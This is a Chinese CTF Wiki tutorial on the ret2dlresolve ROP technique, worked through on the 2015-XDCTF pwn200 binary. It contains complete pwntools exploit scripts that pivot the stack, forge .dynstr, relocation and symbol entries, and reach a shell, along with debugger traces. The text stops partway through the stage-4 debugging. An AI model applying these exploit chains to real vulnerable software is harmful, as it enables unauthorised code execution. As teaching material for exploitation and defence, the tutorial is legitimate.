---
title: "ret2dlresolve (CTF Wiki)"
category: "pwn"
subcategory: "advanced-rop"
type: "technique"
tags: ["ctf-wiki", "pwn", "rop", "ret2dlresolve", "heap", "canary", "pie", "pwntools", "gef", "checksec", "advanced-rop", "advanced", "chinese", "zh"]
summary: "在学习这个 ROP 利用技巧前，需要首先理解动态链接的基本过程以及 ELF 文件中动态链接相关的结构。读者可以参考 executable 部分  ELF 对应的介绍。这里只给出相应的利用方式。"
source:
  name: "CTF Wiki"
  url: "https://github.com/ctf-wiki/ctf-wiki/blob/e225ddfcd420a7f54a5940f47336ebdf8c29b875/docs/zh/docs/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve.md"
license: "CC BY-NC-SA 4.0"
difficulty: "hard"
when_to_use: ["32 位例子", "used to call dlruntimeresolve()", "used to make faking data, such relocation, Symbol, Str", "64 位例子"]
---

# ret2dlresolve

在学习这个 ROP 利用技巧前，需要首先理解动态链接的基本过程以及 ELF 文件中动态链接相关的结构。读者可以参考 executable 部分  ELF 对应的介绍。这里只给出相应的利用方式。

## 原理

在 Linux 中，程序使用 `_dl_runtime_resolve(link_map_obj, reloc_offset)` 来对动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。这也是 ret2dlresolve 攻击的核心所在。

具体的，动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 `.dynamic` 索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那么攻击就达成了。

### 思路1 - 直接控制重定位表项的相关内容

由于动态链接器最后在解析符号的地址时，是依据符号的名字进行解析的。因此，一个很自然的想法是直接修改动态字符串表 `.dynstr`，比如把某个函数在字符串表中对应的字符串修改为目标函数对应的字符串。但是，动态字符串表和代码映射在一起，是只读的。此外，类似地，我们可以发现动态符号表、重定位表项都是只读的。

但是，假如我们可以控制程序执行流，那我们就可以伪造合适的重定位偏移，从而达到调用目标函数的目的。然而，这种方法比较麻烦，因为我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保动态链接器在解析的过程中不会出错。

### 思路2 - 间接控制重定位表项的相关内容

既然动态链接器会从 `.dynamic` 节中索引到各个目标节，那如果我们可以修改动态节中的内容，那自然就很容易控制待解析符号对应的字符串，从而达到执行目标函数的目的。

### 思路3 - 伪造 link_map

由于动态连接器在解析符号地址时，主要依赖于 link_map 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。

下面我们以 2015-XDCTF-pwn200 来介绍 32 位和 64 位下如何使用 ret2dlresolve 技巧。

## 32 位例子

### NO RELRO

首先，我们可以按照下面的方式来编译对应的文件。
```shell
❯ gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32
❯ checksec main_no_relro_32
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

在这种情况下，修改 `.dynamic` 会简单些。因为我们只需要修改 `.dynamic` 节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串基本就行了。具体思路如下

1. 修改 .dynamic 节中字符串表的地址为伪造的地址
2. 在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。
3. 在特定的位置读取 /bin/sh 字符串。
4. 调用 read 函数的 plt 的第二条指令，触发 `_dl_runtime_resolve` 进行函数解析，从而执行 system 函数。

代码如下
```python
from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch="i386"
p = process("./main_no_relro_32")
rop = ROP("./main_no_relro_32")
elf = ELF("./main_no_relro_32")

p.recvuntil('Welcome to XDCTF2015~!\n')

offset = 112
rop.raw(offset*'a')
rop.read(0,0x08049804+4,4) # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.read(0,0x080498E0,len((dynstr))) # construct a fake dynstr section
rop.read(0,0x080498E0+0x100,len("/bin/sh\x00")) # read /bin/sh\x00
rop.raw(0x08048376) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw(0x080498E0+0x100)
# print(rop.dump())
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
p.send(rop.chain())
p.send(p32(0x080498E0))
p.send(dynstr)
p.send("/bin/sh\x00")
p.interactive()
```

运行效果如下
```python
❯ python exp-no-relro.py
[+] Starting local process './main_no_relro_32': pid 35093
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 10 cached gadgets for './main_no_relro_32'
[*] Switching to interactive mode
$ ls
exp-no-relro.py  main_no_relro_32
```

### Partial RELRO

首先我们可以编译源文件 main.c 得到二进制文件，这里取消了 Canary 保护。
```shell
❯ gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie ../../main.c -o main_partial_relro_32
❯ checksec main_partial_relro_32
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/parti
al-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

在这种情况下，ELF 文件中的 .dynamic 节将会变成只读的，这时我们可以通过伪造重定位表项的方式来调用目标函数。

在下面的讲解过程中，本文会按照以下两种不同的方式来使用该技巧。

1.  通过手工伪造的方式使用该技巧，从而获取 shell。这种方式虽然比较麻烦，但是可以仔细理解 ret2dlresolve 的原理。
2.  利用工具来实现攻击，从而获取 shell。这种方式比较简单，但我们还是应该充分理解背后的原理，不能只是会使用工具。

#### 手工伪造

这题我们不考虑有 libc 的情况。通过分析，我们可以发现程序有一个很明显的栈溢出漏洞，缓冲区到返回地址间的偏移为 112。
```asm
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as '$_gef0'
gef➤  r
Starting program: /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
Welcome to XDCTF2015~!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xc9
$ebx   : 0x62616162 ("baab"?)
$ecx   : 0xffffcddc  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$edx   : 0x100
$esp   : 0xffffce50  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0xf7fb0000  →  0x001d7d6c
$edi   : 0xffffcec0  →  0x00000001
$eip   : 0x62616164 ("daab"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────── stack ────
0xffffce50│+0x0000: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"	 ← $esp
0xffffce54│+0x0004: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0xffffce58│+0x0008: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
0xffffce5c│+0x000c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0xffffce60│+0x0010: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
0xffffce64│+0x0014: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0xffffce68│+0x0018: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffce6c│+0x001c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
─────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616164
─────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "main_partial_re", stopped 0x62616164 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────
0x62616164 in ?? ()
gef➤  pattern search 0x62616164
[+] Searching '0x62616164'
[+] Found at offset 112 (little-endian search) likely
```

在下面的每一个阶段中，我们会一步步地深入理解如何构造 payload。

##### stage 1

在这一阶段，我们的目的比较简单，就是控制程序直接执行 write 函数。在栈溢出的情况下，我们其实可以直接控制返回地址来控制程序直接执行 write 函数。但是这里我们采用一个相对复杂点的办法，即先使用栈迁移，将栈迁移到 bss 段，然后再来控制 write 函数。因此，这一阶段主要包括两步

1. 将栈迁移到 bss 段。
2. 通过 write 函数的 plt 表项来执行 write 函数，输出相应字符串。

这里使用了 pwntools 中的 ROP 模块。具体代码如下
```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"
rop.write(1, base_stage + 80, len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())

r.interactive()
```

结果如下
```shell
❯ python stage1.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 25112
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 2

在这一阶段，我们将会进一步利用 `_dl_runtime_resolve` 相关的知识来控制程序执行 write 函数。

1. 将栈迁移到 bss 段。
2. 控制程序直接执行 plt0 中的相关指令，即 push linkmap 以及跳转到 `_dl_runtime_resolve` 函数。这时，我们还需要提供  write 重定位项在 got 表中的偏移。这里，我们可以直接使用 write plt 中提供的偏移，即 0x080483C6 处所给出的 0x20。其实，我们也可以跳转到 0x080483C6 地址处，利用原有的指令来提供 write 函数的偏移，并跳转到 plt0。
```
.plt:08048370 ; ===========================================================================
.plt:08048370
.plt:08048370 ; Segment type: Pure code
.plt:08048370 ; Segment permissions: Read/Execute
.plt:08048370 _plt            segment para public 'CODE' use32
.plt:08048370                 assume cs:_plt
.plt:08048370                 ;org 8048370h
.plt:08048370                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.plt:08048370
.plt:08048370 ; =============== S U B R O U T I N E =======================================
.plt:08048370
.plt:08048370
.plt:08048370 sub_8048370     proc near               ; CODE XREF: .plt:0804838B↓j
.plt:08048370                                         ; .plt:0804839B↓j ...
.plt:08048370 ; __unwind {
.plt:08048370                 push    ds:dword_804A004
.plt:08048376                 jmp     ds:dword_804A008
.plt:08048376 sub_8048370     endp
.plt:08048376
...
.plt:080483C0 ; =============== S U B R O U T I N E =======================================
.plt:080483C0
.plt:080483C0 ; Attributes: thunk
.plt:080483C0
.plt:080483C0 ; ssize_t write(int fd, const void *buf, size_t n)
.plt:080483C0 _write          proc near               ; CODE XREF: main+8A↓p
.plt:080483C0
.plt:080483C0 fd              = dword ptr  4
.plt:080483C0 buf             = dword ptr  8
.plt:080483C0 n               = dword ptr  0Ch
.plt:080483C0
.plt:080483C0                 jmp     ds:off_804A01C
.plt:080483C0 _write          endp
.plt:080483C0
.plt:080483C6 ; ---------------------------------------------------------------------------
.plt:080483C6                 push    20h ; ' '
.plt:080483CB                 jmp     sub_8048370
```

具体代码如下
```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./main_partial_relro_32')
plt0 = elf.get_section_by_name('.plt').header.sh_addr
jmprel_data = elf.get_section_by_name('.rel.plt').data()
writegot = elf.got["write"]
write_reloc_offset = jmprel_data.find(p32(writegot,endian="little"))
print(write_reloc_offset)
rop.raw(plt0)
rop.raw(write_reloc_offset)
# fake ret addr of write
rop.raw('bbbb')
# fake write args, write(1, base_stage+80, sh)
rop.raw(1)  
rop.raw(base_stage + 80)
sh = "/bin/sh"
rop.raw(len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

效果如下，仍然输出了 sh 对应的字符串。
```shell
❯ python stage2.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 25131
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
32
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 3

这一次，我们同样控制  `_dl_runtime_resolve` 函数中的 reloc_offset 参数，不过这次控制其指向我们伪造的 write 重定位项。

鉴于 pwntools 本身并不支持对重定位表项的信息的获取。这里我们手动看一下
```shell
❯ readelf -r main_partial_relro_32

Relocation section '.rel.dyn' at offset 0x30c contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff4  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
08049ff8  00000706 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0
08049ffc  00000806 R_386_GLOB_DAT    00000000   stdout@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x324 contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
```

可以看出 write 的重定表项的 r_offset=0x0804a01c，r_info=0x00000607。具体代码如下
```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./main_partial_relro_32')
plt0 = elf.get_section_by_name('.plt').header.sh_addr
got0 = elf.get_section_by_name('.got').header.sh_addr

rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
# make base_stage+24 ---> fake reloc
write_reloc_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = 0x607

rop.raw(plt0)
rop.raw(write_reloc_offset)
# fake ret addr of write
rop.raw('bbbb')
# fake write args, write(1, base_stage+80, sh)
rop.raw(1)  
rop.raw(base_stage + 80)
sh = "/bin/sh"
rop.raw(len(sh))
# construct fake write relocation entry
rop.raw(write_got)
rop.raw(r_info)
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

这次我们在 base_stage+24 处伪造了一个 write 的重定位项，仍然输出了对应的字符串。
```shell
❯ python stage3.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 24506
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 4

在 stage3 中，我们控制了重定位表项，但是伪造的重定位表项的内容仍然与 write 函数原来的重定位表项一致。

在这个阶段中，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道，write 对应的符号在符号表的下标为 0x607>>8=0x6。因此，我们知道 write 对应的符号地址为 0x0804822c。
```shell
❯ readelf -x .dynsym main_partial_relro_32

Hex dump of section '.dynsym':
  0x080481cc 00000000 00000000 00000000 00000000 ................
  0x080481dc 33000000 00000000 00000000 12000000 3...............
  0x080481ec 27000000 00000000 00000000 12000000 '...............
  0x080481fc 5c000000 00000000 00000000 20000000 \........... ...
  0x0804820c 20000000 00000000 00000000 12000000  ...............
  0x0804821c 3a000000 00000000 00000000 12000000 :...............
  0x0804822c 4c000000 00000000 00000000 12000000 L...............
  0x0804823c 1a000000 00000000 00000000 11000000 ................
  0x0804824c 2c000000 00000000 00000000 11000000 ,...............
  0x0804825c 0b000000 6c860408 04000000 11001000 ....l...........
```

这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为 16 个字节。
```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())


rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
fake_write_sym = flat([0x4c, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

直接执行后发现并不行
```shell
❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27370
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```

发现程序已经崩溃了，通过 coredump，可以发现程序在 `ld-linux.so.2` 中崩了。
```assembly
 ► 0xf7f77fed    mov    ebx, dword ptr [edx + 4]
   0xf7f77ff0    test   ebx, ebx
   0xf7f77ff2    mov    ebx, 0
   0xf7f77ff7    cmove  edx, ebx
   0xf7f77ffa    mov    esi, dword ptr gs:[0xc]
   0xf7f78001    test   esi, esi
   0xf7f78003    mov    ebx, 1
   0xf7f78008    jne    0xf7f78078 <0xf7f78078>
    ↓
   0xf7f78078    mov    dword ptr gs:[0x1c], 1
   0xf7f78083    mov    ebx, 5
   0xf7f78088    jmp    0xf7f7800a <0xf7f7800a>
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp  0x804a7dc ◂— 0x0
... ↓
02:0008│      0x804a7e4 —▸ 0xf7f90000 ◂— 0x26f34
03:000c│      0x804a7e8 —▸ 0x804826c ◂— add    byte ptr [ecx + ebp*2 + 0x62], ch
04:0010│      0x804a7ec ◂— 0x0
... ↓
07:001c│      0x804a7f8 —▸ 0x804a84c ◂— 0x4c /* 'L' */
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► f 0 f7f77fed
   f 1        0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x804a000 r-xp     2000 0      ./main_partial_relro_32
 0x8049000  0x804b000 rw-p     2000 0      [stack]
 0x804a000  0x804b000 rw-p     1000 1000   ./main_partial_relro_32
0xf7d6b000 0xf7f40000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc.so.6
0xf7f40000 0xf7f41000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc.so.6
0xf7f41000 0xf7f43000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc.so.6
0xf7f43000 0xf7f47000 rw-p     4000 1d7000 /lib/i386-linux-gnu/libc.so.6
0xf7f67000 0xf7f69000 r-xp     2000 0      [vdso]
0xf7f69000 0xf7f90000 r-xp    27000 0      [linker]
0xf7f69000 0xf7f90000 r-xp    27000 0      /lib/ld-linux.so.2
0xf7f90000 0xf7f91000 rw-p     1000 26000  [linker]
0xf7f90000 0xf7f91000 rw-p     1000 26000  /lib/ld-linux.so.2
```

通过逆向分析 ld-linux.so.2 
```c
  if ( v9 )
  {
    v10 = (char *)a1[92] + 16 * (*(_WORD *)(*((_DWORD *)v9 + 1) + 2 * v4) & 0x7FFF);
    if ( !*((_DWORD *)v10 + 1) )
      v10 = 0;
  }
```

以及源码可以知道程序是在访问 version 的 hash 时出错。
```c
        if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
        {
            const ElfW(Half) *vernum =
                (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }
```

进一步分析可以知道，因为我们伪造了 write 函数的重定位表项，其中 reloc->r_info 被设置成了比较大的值（由于 index_dynsym 离符号表比较远）。这时候，ndx 的值并不可预期，进而 version 的值也不可预期，因此可能出现不可预期的情况。

通过分析 .dynmic 节，我们可以发现 vernum 的地址为 0x80482d8。
```
❯ readelf -d main_partial_relro_32

Dynamic section at offset 0xf0c contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x804834c
 0x0000000d (FINI)                       0x8048654
 0x00000019 (INIT_ARRAY)                 0x8049f04
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049f08
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804826c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      107 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804a000
 0x00000002 (PLTRELSZ)                   40 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x8048324
 0x00000011 (REL)                        0x804830c
 0x00000012 (RELSZ)                      24 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x80482ec
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x80482d8
 0x00000000 (NULL)                       0x0
```

在 ida 中，我们也可以看到相关的信息
```assembly
LOAD:080482D8 ; ELF GNU Symbol Version Table
LOAD:080482D8                 dw 0
LOAD:080482DA                 dw 2                    ; setbuf@@GLIBC_2.0
LOAD:080482DC                 dw 2                    ; read@@GLIBC_2.0
LOAD:080482DE                 dw 0                    ; local  symbol: __gmon_start__
LOAD:080482E0                 dw 2                    ; strlen@@GLIBC_2.0
LOAD:080482E2                 dw 2                    ; __libc_start_main@@GLIBC_2.0
LOAD:080482E4                 dw 2                    ; write@@GLIBC_2.0
LOAD:080482E6                 dw 2                    ; stdin@@GLIBC_2.0
LOAD:080482E8                 dw 2                    ; stdout@@GLIBC_2.0
LOAD:080482EA                 dw 1                    ; global symbol: _IO_stdin_used
```

那我们可以再次运行看一下伪造后 ndx 具体的值
```shell
❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27649
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
ndx_addr: 0x80487a8
```

可以发现，ndx_落入了 `.eh_frame` 节中。
```assembly
.eh_frame:080487A8                 dw 442Ch
```

进一步地，ndx 的值为 0x442C。显然不知道会索引到哪里去。
```c
        if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
        {
            const ElfW(Half) *vernum =
                (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }
```

通过动态调试，我们可以发现 l_versions 的起始地址，并且其中一共有 3 个元素。
```assembly
pwndbg> print *((struct link_map *)0xf7f0d940)
$4 = {
  l_addr = 0, 
  l_name = 0xf7f0dc2c "", 
  l_ld = 0x8049f0c, 
  l_next = 0xf7f0dc30, 
  l_prev = 0x0, 
  l_real = 0xf7f0d940, 
  l_ns = 0, 
  l_libname = 0xf7f0dc20, 
  l_info = {0x0, 0x8049f0c, 0x8049f7c, 0x8049f74, 0x0, 0x8049f4c, 0x8049f54, 0x0, 0x0, 0x0, 0x8049f5c, 0x8049f64, 0x8049f14, 0x8049f1c, 0x0, 0x0, 0x0, 0x8049f94, 0x8049f9c, 0x8049fa4, 0x8049f84, 0x8049f6c, 0x0, 0x8049f8c, 0x0, 0x8049f24, 0x8049f34, 0x8049f2c, 0x8049f3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fb4, 0x8049fac, 0x0 <repeats 13 times>, 0x8049fbc, 0x0 <repeats 25 times>, 0x8049f44}, 
  l_phdr = 0x8048034, 
  l_entry = 134513632, 
  l_phnum = 9, 
  l_ldnum = 0, 
  l_searchlist = {
    r_list = 0xf7edf3e0, 
    r_nlist = 3
  }, 
  l_symbolic_searchlist = {
    r_list = 0xf7f0dc1c, 
    r_nlist = 0
  }, 
  l_loader = 0x0, 
  l_versions = 0xf7edf3f0, 
  l_nversions = 3, 
```

对应的分别为 
```assembly
pwndbg> print *((struct r_found_version[3] *)0xf7edf3f0)
$13 = {{
    name = 0x0, 
    hash = 0, 
    hidden = 0, 
    filename = 0x0
  }, {
    name = 0x0, 
    hash = 0, 
    hidden = 0, 
    filename = 0x0
  }, {
    name = 0x80482be "GLIBC_2.0", 
    hash = 225011984, 
    hidden = 0, 
    filename = 0x804826d "libc.so.6"
  }}

```

此时，计算得到的 version 地址为 0xf7f236b0，显然不在映射的内存区域。
```assembly
pwndbg> print /x 0xf7edf3f0+0x442C*16
$16 = 0xf7f236b0
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
